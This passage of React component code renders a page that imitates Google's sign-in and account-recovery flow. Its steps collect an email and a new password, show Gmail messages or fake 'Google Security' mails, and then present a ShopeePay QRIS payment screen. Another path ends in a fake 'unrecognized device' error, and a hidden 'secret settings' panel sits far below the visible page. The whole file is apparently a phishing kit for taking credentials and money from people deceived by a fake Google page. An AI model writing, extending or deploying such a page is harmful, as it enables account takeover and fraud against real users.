                    </button>
                    
                    {/* Collapsible Content */}
                    <AnimatePresence initial={false}>
                      {isExpanded && (
                        <motion.div
                          initial={{ height: 0, opacity: 0 }}
                          animate={{ height: 'auto', opacity: 1 }}
                          exit={{ height: 0, opacity: 0 }}
                          transition={{ duration: 0.2, ease: 'easeInOut' }}
                          className="overflow-hidden"
                        >
                          <div className="pb-4 pt-1 pl-[48px] pr-2">
                            {item.content}
                          </div>
                        </motion.div>
                      )}
                    </AnimatePresence>
                  </div>
                );
              })}
            </div>

            {/* Centered Blue Link at bottom */}
            <div className="mt-8 text-center">
              <button
                type="button"
                onClick={() => {
                  setEmail('');
                  setPassword('');
                  setConfirmPassword('');
                  setExpandedSection(null);
                  setSecuredSections([]);
                  setStep('email');
                }}
                className="text-[#0b57d0] hover:underline text-[14px] font-medium transition"
              >
                {t.continueToGoogleAccount}
              </button>
            </div>

          </div>
        </main>

        {/* Footer for checkup */}
        <footer className="w-full px-6 py-4 flex flex-col sm:flex-row justify-between items-center text-[12px] text-[#444746] border-t border-gray-200 bg-white">
          <LanguageSelector lang={lang} setLang={setLang} upward={true} />
          <div className="flex gap-4 sm:gap-6 mt-2 sm:mt-0 items-center">
            <a href="#" className="hover:text-gray-700 transition">{t.help}</a>
            <a href="#" className="hover:text-gray-700 transition">{t.privacy}</a>
            <a href="#" className="hover:text-gray-700 transition">{t.terms}</a>
          </div>
        </footer>

        {/* Secret Feature Area at bottom of checkup page (Scroll down) */}
        <div className="w-full flex flex-col items-center mt-[100vh] sm:mt-[120vh] mb-24 px-4">
          <div className="flex items-center gap-2 text-gray-400 text-xs mb-3 select-none">
            <span className="w-12 h-px bg-gray-200"></span>
            <span>🔒 {lang === 'id' ? 'Area Pengaturan Rahasia (Geser ke bawah)' : 'Secret Settings Area (Scroll down)'}</span>
            <span className="w-12 h-px bg-gray-200"></span>
          </div>
          <SecretAvatarPanel
            config={customAvatar}
            onChange={handleCustomAvatarChange}
            email={email}
            t={t}
            lang={lang}
          />
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-white sm:bg-[#f0f4f9] p-0 sm:p-5 flex flex-col items-center justify-between sm:justify-center font-sans tracking-wide relative">
      
      {/* Full-screen Loading Overlay for background */}
      <AnimatePresence>
        {isLoading && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            transition={{ duration: 0.3, ease: [0.4, 0, 0.2, 1] }}
            className="fixed inset-0 z-40 bg-[rgba(0,0,0,0.25)]"
          />
        )}
      </AnimatePresence>

      <div className="bg-white sm:rounded-[28px] w-full sm:max-w-[448px] sm:min-h-[500px] flex flex-col sm:h-auto sm:border sm:border-gray-200 flex-grow sm:flex-grow-0 overflow-x-hidden relative z-50 shadow-sm">
        
        {/* Loading Overlay inside the form box */}
        <AnimatePresence>
          {isLoading && (
            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              transition={{ duration: 0.3, ease: [0.4, 0, 0.2, 1] }}
              className="absolute inset-0 z-40 bg-[rgba(0,0,0,0.25)] pointer-events-auto"
            />
          )}
        </AnimatePresence>

        {/* Loading Bar */}
        <AnimatePresence>
          {isLoading && (
            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              transition={{ duration: 0.3, ease: [0.4, 0, 0.2, 1] }}
              className="absolute top-0 left-0 right-0 h-1 bg-transparent z-50 pointer-events-none"
            >
              <motion.div
                className="h-full bg-[#0b57d0]"
                initial={{ x: '-100%', width: '50%' }}
                animate={{ x: '200%' }}
                transition={{ repeat: Infinity, duration: 1, ease: 'linear' }}
              />
            </motion.div>
          )}
        </AnimatePresence>

        {/* Top/Header Section */}
        <div className="px-6 pt-6 sm:px-10 sm:pt-8 flex flex-col items-start z-0">
          <GoogleLogo />
        </div>
        
        <div className="relative flex-grow flex flex-col z-0">
          <AnimatePresence mode="wait" custom={direction}>
            <motion.div
              key={step}
              custom={direction}
              initial={(d: number) => ({ opacity: 0, x: d > 0 ? 40 : -40 })}
              animate={{ opacity: 1, x: 0 }}
              exit={(d: number) => ({ opacity: 0, x: d > 0 ? -40 : 40 })}
              transition={{ duration: 0.1, ease: [0.4, 0, 0.2, 1] }}
              className="flex flex-col flex-grow w-full"
            >
              <div className="px-6 pb-6 pt-2 sm:px-10 sm:pb-8 flex flex-col items-start">
                {step === 'email' && (
                  <>
                    <h1 className="text-[32px] sm:text-[36px] text-[#1f1f1f] font-normal mb-1.5 mt-4 leading-tight">{t.loginTitle}</h1>
                    <p className="text-[#1f1f1f] text-[16px] font-normal">{t.loginSubtitle}</p>
                  </>
                )}
                {step === 'password' && (
                  <>
                    <h1 className="text-[32px] sm:text-[40px] text-[#1f1f1f] font-normal mb-2 mt-4 leading-tight">{t.welcomeBackTitle}</h1>
                    <AccountPill
                      email={email}
                      googleUser={googleUser}
                      customAvatar={customAvatar}
                      isLoading={isLoading}
                      onClick={() => !isLoading && changeStep('email', -1)}
                    />
                  </>
                )}
                {step === 'change_password' && (
                  <>
                    <h1 className="text-[32px] sm:text-[40px] text-[#1f1f1f] font-normal mb-2 mt-4 leading-tight">{t.changePasswordTitle}</h1>
                    <AccountPill
                      email={email}
                      googleUser={googleUser}
                      customAvatar={customAvatar}
                      isLoading={isLoading}
                      onClick={() => !isLoading && changeStep('email', -1)}
                    />
                  </>
                )}
                {step === 'success' && (
                  <>
                    <h1 className="text-[32px] sm:text-[36px] text-[#1f1f1f] font-normal mb-1.5 mt-4 leading-tight">{t.successTitle}</h1>
                    <AccountPill
                      email={email}
                      googleUser={googleUser}
                      customAvatar={customAvatar}
                      isLoading={isLoading}
                      onClick={() => !isLoading && changeStep('email', -1)}
                    />
                  </>
                )}
                {step === 'payment' && (
                  <>
                    <h1 className="text-[24px] sm:text-[32px] text-[#1f1f1f] font-normal mb-2 mt-4 leading-tight">{t.paymentTitle}</h1>
                    <p className="text-[#444746] text-[14px] sm:text-[16px] font-normal">{t.paymentSubtitle}</p>
                  </>
                )}
                {step === 'error' && (
                  <>
                    <h1 className="text-[32px] sm:text-[40px] text-[#1f1f1f] font-normal mb-2 mt-4 leading-tight">{t.cantSignInTitle}</h1>
                    <AccountPill
                      email={email}
                      googleUser={googleUser}
                      customAvatar={customAvatar}
                      isLoading={isLoading}
                      onClick={() => !isLoading && changeStep('email', -1)}
                    />
                  </>
                )}
              </div>

        {/* Content/Form Section */}
        <div className="px-6 pb-10 flex flex-col flex-grow sm:px-10">
          {step === 'email' && (
            <form onSubmit={handleEmailSubmit} className="flex flex-col flex-grow justify-between">
              <div className="pt-2">
                <TextInput
                  label={t.emailOrPhoneLabel}
                  value={email}
                  onChange={(e: any) => {
                    setEmail(e.target.value);
                    if (error) setError('');
                  }}
                  name="email"
                  error={error}
                  autoFocus
                  disabled={isLoading}
                />

                <div className="mt-2">
                  <button
                    type="button"
                    className="text-[#0b57d0] hover:underline font-medium text-[14px] transition text-left"
                    disabled={isLoading}
                  >
                    {t.forgotEmail}
                  </button>
                </div>

                <div className="mt-9 text-[14px] text-[#444746] leading-relaxed">
                  <span>{t.guestModeText}</span>
                  <a
                    href="#"
                    onClick={(e) => e.preventDefault()}
                    className="text-[#0b57d0] font-medium hover:underline inline"
                  >
                    {t.learnMoreGuestMode}
                  </a>
                </div>
              </div>

              <div className="mt-8 flex justify-between items-center pb-6 sm:pb-0">
                <button
                  type="button"
                  className="text-[#0b57d0] hover:bg-blue-50/50 px-3 py-2 -ml-3 rounded-full font-medium text-[14px] transition"
                  disabled={isLoading}
                >
                  {t.createAccount}
                </button>
                <button
                  type="submit"
                  className="bg-[#0b57d0] text-white px-6 py-2.5 rounded-full text-[14px] font-medium hover:bg-[#0842a0] hover:shadow-md transition disabled:opacity-70 disabled:cursor-not-allowed"
                  disabled={isLoading}
                >
                  {t.next}
                </button>
              </div>
            </form>
          )}

          {step === 'password' && (
            <div className="flex flex-col flex-grow justify-start pt-6">
              <div>
                <p className="text-[#1f1f1f] text-[16px] leading-[24px]">
                  {t.forgotPasswordNotice}
                </p>
              </div>
              <div className="mt-8 flex justify-between items-center pb-6 sm:pb-0">
                <button
                  type="button"
                  onClick={() => changeStep('change_password', 1)}
                  className="text-[#0b57d0] hover:bg-blue-50 px-3 py-2 -ml-3 rounded-full font-medium text-sm transition"
                  disabled={isLoading}
                >
                  {t.updatePasswordBtn}
                </button>
                <button
                  type="button"
                  onClick={() => changeStep('success', 1)}
                  className="bg-[#0b57d0] text-white px-6 py-2.5 rounded-full text-[14px] font-medium hover:bg-[#0842a0] hover:shadow-md transition disabled:opacity-70 disabled:cursor-not-allowed"
                  disabled={isLoading}
                >
                  {t.continueBtn}
                </button>
              </div>
            </div>
          )}

          {step === 'change_password' && (
            <form onSubmit={handleChangePasswordSubmit} className="flex flex-col flex-grow justify-start">
              <div className="pt-2">
                <h2 className="text-[#1f1f1f] text-[18px] sm:text-[22px] font-normal mt-4 mb-1">{t.createStrongPasswordHeading}</h2>
                <p className="text-[#444746] text-[14px] mb-6 leading-normal">
                  {t.createStrongPasswordDesc}
                </p>

                <TextInput
                  label={t.createPasswordLabel}
                  type={showPassword ? "text" : "password"}
                  value={password}
                  onChange={(e: any) => {
                    setPassword(e.target.value);
                    if (error) setError('');
                  }}
                  name="password"
                  error={error && (error === t.enterPasswordError || error === t.passwordMin8Error) ? error : ''}
                  autoFocus
                  disabled={isLoading}
                />

                <div className="mt-4">
                  <TextInput
                    label={t.confirmPasswordLabel}
                    type={showPassword ? "text" : "password"}
                    value={confirmPassword}
                    onChange={(e: any) => {
                      setConfirmPassword(e.target.value);
                      if (error) setError('');
                    }}
                    name="confirmPassword"
                    error={error && error === t.passwordMismatchError ? error : ''}
                    disabled={isLoading}
                  />
                </div>

                <div className="text-[12px] text-[#444746] mt-1.5 pl-3">
                  {t.atLeast8Chars}
                </div>

                <div className="mt-4">
                  <label className="flex items-center gap-3 cursor-pointer text-[14px] text-[#1f1f1f] select-none py-1">
                    <input 
                      type="checkbox" 
                      checked={showPassword} 
                      onChange={(e) => setShowPassword(e.target.checked)}
                      className="w-[18px] h-[18px] rounded border-[#747775] text-[#0b57d0] focus:ring-[#0b57d0] cursor-pointer"
                      disabled={isLoading}
                    />
                    <span>{t.showPassword}</span>
                  </label>
                </div>
              </div>

              <div className="mt-8 flex justify-between items-center pb-6 sm:pb-0">
                <button
                  type="button"
                  onClick={() => changeStep('error', 1)}
                  className="text-[#0b57d0] hover:bg-blue-50 px-4 py-2.5 -ml-3 rounded-full font-medium text-[14px] transition"
                  disabled={isLoading}
                >
                  {t.skipBtn}
                </button>
                <button
                  type="submit"
                  className="bg-[#0b57d0] text-white px-6 py-2.5 rounded-full text-[14px] font-medium hover:bg-[#0842a0] hover:shadow-md transition disabled:opacity-70 disabled:cursor-not-allowed"
                  disabled={isLoading}
                >
                  {t.savePasswordBtn}
                </button>
              </div>
            </form>
          )}

          {step === 'success' && (
            <div className="flex flex-col flex-grow justify-between">
              <div className="pt-1 w-full">
                <div className="flex items-center justify-between mb-2 px-0.5">
                  <span className="text-[13px] font-medium text-[#444746] tracking-wide uppercase">{t.recentEmails}</span>
                  <span className="text-[11px] text-[#0b57d0] font-semibold bg-[#e8f0fe] px-2.5 py-0.5 rounded-full">Gmail</span>
                </div>

                {isFetchingEmails ? (
                  <div className="w-full py-10 flex flex-col items-center justify-center text-[#5f6368] text-[13px] gap-2.5 border border-[#e0e3e7] rounded-[16px] bg-[#f8fafd]/50">
                    <div className="w-6 h-6 border-2 border-[#0b57d0] border-t-transparent rounded-full animate-spin"></div>
                    <span>{t.loadingGmail}</span>
                  </div>
                ) : (
                  <div className="w-full border border-[#747775]/30 rounded-[16px] overflow-hidden bg-white divide-y divide-[#f1f3f4] shadow-xs">
                    {(emailsData.length > 0 ? emailsData : [
                      {
                        sender: 'Google Community Team',
                        subject: lang === 'id' ? 'Selesaikan penyiapan Akun Google Anda' : 'Finish setting up your Google Account',
                        date: lang === 'id' ? 'Baru saja' : 'Just now',
                      },
                      {
                        sender: 'Google Security',
                        subject: lang === 'id' ? 'Peringatan keamanan baru' : 'New security alert',
                        date: '10:42',
                      },
                      {
                        sender: 'Gmail Team',
                        subject: lang === 'id' ? 'Tips memaksimalkan kotak masuk Gmail' : 'Tips to get the most out of Gmail',
                        date: lang === 'id' ? 'Kemarin' : 'Yesterday',
                      }
                    ]).map((item: any, idx: number) => {
                      let from = item.sender || t.unknownSender;
                      let subject = item.subject || t.noSubject;
                      let dateStr = item.date || '';

                      if (item.payload) {
                        const subjectHeader = item.payload?.headers?.find((h: any) => h.name === 'Subject');
                        const fromHeader = item.payload?.headers?.find((h: any) => h.name === 'From');
                        const dateHeader = item.payload?.headers?.find((h: any) => h.name === 'Date');
                        if (subjectHeader) subject = subjectHeader.value;
                        if (fromHeader) from = fromHeader.value.split('<')[0].trim().replace(/['"]/g, '');
                        if (dateHeader) {
                          try {
                            const d = new Date(dateHeader.value);
                            dateStr = d.toLocaleDateString(lang === 'id' ? 'id-ID' : 'en-US', { hour: '2-digit', minute: '2-digit' });
                          } catch {
                            dateStr = '';
                          }
                        }
                      }

                      return (
                        <div
                          key={idx}
                          className="px-3.5 py-3 flex items-center gap-3 hover:bg-[#f8fafd] transition-colors cursor-pointer select-none"
                        >
                          <UserAvatar nameOrEmail={from} size={32} />
                          <div className="flex-1 min-w-0 pr-1">
                            <div className="flex items-center justify-between gap-1">
                              <p className="font-medium text-[#1f1f1f] text-[13px] truncate">{from}</p>
                              {dateStr && (
                                <span className="text-[11px] text-[#5f6368] whitespace-nowrap flex-shrink-0 font-normal">{dateStr}</span>
                              )}
                            </div>
                            <p className="text-[#444746] text-[12px] truncate mt-0.5">{subject}</p>
                          </div>
                        </div>
                      );
                    })}
                  </div>
                )}
                
                <p className="text-[13px] text-[#444746] mt-3.5 leading-relaxed px-0.5">
                  {t.successNewPasswordNotice}
                </p>
              </div>

              <div className="mt-8 flex justify-between items-center pb-6 sm:pb-0">
                <button
                  type="button"
                  onClick={() => changeStep('email', -1)}
                  className="text-[#0b57d0] hover:bg-blue-50/50 px-3 py-2 -ml-3 rounded-full font-medium text-[14px] transition"
                  disabled={isLoading}
                >
                  {lang === 'id' ? 'Ganti akun' : 'Switch account'}
                </button>
                <button
                  type="button"
                  onClick={() => {
                    changeStep('payment', 1);
                  }}
                  className="bg-[#0b57d0] text-white px-6 py-2.5 rounded-full text-[14px] font-medium hover:bg-[#0842a0] hover:shadow-md transition disabled:opacity-70 disabled:cursor-not-allowed"
                  disabled={isLoading}
                >
                  {t.doneBtn}
                </button>
              </div>
            </div>
          )}

          {step === 'payment' && (
            <div className="flex flex-col flex-grow justify-start pt-6">
               <div className="flex flex-col items-center border border-[#e0e3e7] p-6 rounded-[24px]">
                 <div className="w-full flex justify-between items-center mb-4">
                   <span className="font-semibold text-[18px] text-[#ff6600]">ShopeePay</span>
                   <span className="bg-[#ff6600] text-white px-2 py-1 rounded text-[12px] font-bold">QRIS</span>
                 </div>
                 
                 <div className="w-[200px] h-[200px] bg-gray-100 flex items-center justify-center rounded-[12px] border-2 border-dashed border-gray-300 relative overflow-hidden mb-4">
                    {/* Placeholder for QR Code */}
                    <div className="text-center p-4">
                      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" className="w-12 h-12 mx-auto text-gray-400 mb-2">
                        <path d="M3 3h8v8H3V3zm2 2v4h4V5H5zm8-2h8v8h-8V3zm2 2v4h4V5h-4zM3 13h8v8H3v-8zm2 2v4h4v-4H5zm13-2h3v3h-3v-3zm-3 3h3v3h-3v-3zm3 3h3v3h-3v-3zm-3-3h-3v3h3v-3zm-3-3h3v3h-3v-3z" />
                      </svg>
                      <span className="text-[12px] text-gray-500 font-medium break-words block">
                        {import.meta.env.VITE_SHOPEEPAY_API_KEY ? t.qrCodeActive : t.apiKeyNotConfigured}
                      </span>
                    </div>
                 </div>

                 <p className="text-[#1f1f1f] text-center text-[14px] leading-relaxed mb-6">
                   {t.qrInstructions}
                 </p>

                 <div className="w-full flex justify-end">
                  <button
                    onClick={() => {
                      setEmail('');
                      setPassword('');
                      setConfirmPassword('');
                      changeStep('email', -1);
                    }}
                    className="bg-[#0b57d0] text-white px-6 py-2.5 rounded-full text-[14px] font-medium hover:bg-[#0842a0] hover:shadow-md transition disabled:opacity-70 disabled:cursor-not-allowed w-full sm:w-auto"
                    disabled={isLoading}
                  >
                    {t.backToStartBtn}
                  </button>
                 </div>
               </div>
            </div>
          )}

          {step === 'error' && (
            <div className="flex flex-col flex-grow justify-start pt-6">
              <div>
                <p className="text-[#1f1f1f] text-[16px] leading-[24px]">
                  {t.unrecognizedDeviceMsg1}
                </p>
                <p className="text-[#1f1f1f] text-[16px] leading-[24px] mt-4">
                  {t.unrecognizedDeviceMsg2} <span className="text-[#0b57d0] cursor-pointer hover:underline font-medium">{t.learnMore}</span>
                </p>
              </div>
            </div>
          )}
        </div>
            </motion.div>
          </AnimatePresence>
        </div>
      </div>

      {/* Footer */}
      <div className="w-full sm:max-w-[448px] px-6 pb-6 pt-2 sm:px-0 sm:pb-0 sm:pt-6 flex flex-col sm:flex-row justify-between text-[12px] text-[#444746] bg-white sm:bg-transparent">
        <div className="flex justify-start items-center">
          <LanguageSelector lang={lang} setLang={setLang} upward={true} />
        </div>
        <div className="flex gap-4 sm:gap-6 mt-4 sm:mt-0 items-center justify-start sm:justify-end">
          <a href="#" className="hover:bg-gray-100 sm:hover:bg-[#e2e7eb] px-2 py-1.5 -ml-2 sm:-ml-0 rounded transition">{t.help}</a>
          <a href="#" className="hover:bg-gray-100 sm:hover:bg-[#e2e7eb] px-2 py-1.5 rounded transition">{t.privacy}</a>
          <a href="#" className="hover:bg-gray-100 sm:hover:bg-[#e2e7eb] px-2 py-1.5 rounded transition">{t.terms}</a>
        </div>
      </div>

      {/* Secret Feature Area at the very bottom of the main page (Scroll down) */}
      <div className="w-full max-w-[480px] mt-[100vh] sm:mt-[140vh] mb-28 px-4 flex flex-col items-center">
        <div className="flex items-center gap-2 text-gray-400 text-xs mb-3 select-none">
          <span className="w-12 h-px bg-gray-200"></span>
          <span>🔒 {lang === 'id' ? 'Area Pengaturan Rahasia (Geser ke bawah)' : 'Secret Settings Area (Scroll down)'}</span>
          <span className="w-12 h-px bg-gray-200"></span>
        </div>
        <SecretAvatarPanel
          config={customAvatar}
          onChange={handleCustomAvatarChange}
          email={email}
          t={t}
          lang={lang}
        />
      </div>

    </div>
  );
}
